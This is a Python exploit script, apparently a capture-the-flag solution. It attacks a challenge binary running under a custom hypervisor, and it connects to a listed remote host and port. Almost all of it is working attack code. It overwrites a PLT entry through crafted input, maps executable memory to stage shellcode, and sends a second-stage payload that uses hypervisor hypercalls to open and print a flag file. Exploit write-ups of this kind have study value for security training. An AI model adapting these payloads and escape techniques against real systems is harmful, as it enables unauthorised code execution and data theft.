#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './user.elf'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./hypervisor.elf kernel.bin ld.so.2'.split()+[bin_file], 'aslr':False}, \
                        local   = {'argv':'./hypervisor.elf kernel.bin ld.so.2'.split()+[bin_file]}, \
                        remote  = {'host':'35.200.23.198', 'port':31733})
env.select()

#==========

binf = ELF(bin_file)
offset_plt_write    = binf.plt['write']
offset_s            = 0x2030a4

#==========

def attack(conn):
    shellasm  = shellcraft.mmap(0, 0x1000000, 'PROT_READ | PROT_WRITE | PROT_EXEC', 'MAP_PRIVATE | MAP_ANONYMOUS', -1, 0)
    shellasm  = '\n'.join(shellasm.split('\n')[:-4])
    shellasm += '''
    push SYS_mmap-1
    pop rax
    inc rax
    syscall
    '''
    shellasm += shellcraft.read('STDIN_FILENO', 'rax', 0x1000000)

    exploit_st1  = '30_\\@{}+@@,'.format((offset_s + 0x10) - (offset_plt_write + 6)).ljust(0x10, '\x90')
    exploit_st1 += asm(shellasm)

    shellasm  = '''
    lea  rdi, [rip+filepath]
    call hc_open
    cmp  eax, 0
    js   hc_panic

    mov  rdi, rax
    xor  rsi, rsi
    mov  rdx, 0x1000
    call hc_read
    mov  rdi, rsi
    cmp  eax, 0
    js   hc_panic

    mov  rdi, 1
    xor  rsi, rsi
    mov  rdx, rax
    call hc_write
    mov  rdi, rsi
    cmp  eax, 0
    js   hc_panic

    hlt

    hc_open:
        mov eax, edi
        mov dx, 0x8000
        jmp hypercall
    hc_read:
        call set_args
        mov  dx, 0x8001
        jmp  hypercall
    hc_write:
        call set_args
        mov  dx, 0x8002
        jmp  hypercall
    hc_ioctl:
        call set_args
        mov  dx, 0x8008
        jmp  hypercall
    hc_panic:
        mov  eax, edi
        mov  dx, 0xffff
        jmp  hypercall
    hypercall:
        out dx, eax
        in  eax, dx
        ret
    set_args:
        lea rax, [rip+buf]
        mov qword ptr [rax+0x00], rdi
        mov qword ptr [rax+0x08], rsi
        mov qword ptr [rax+0x10], rdx
        ret

    filepath:   .string "flag2"
    buf:
    '''
    exploit_st2 = asm(shellasm)

    conn.sendlineafter('down.\n', exploit_st1)
    conn.send('\x90'*0x1000+exploit_st2)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
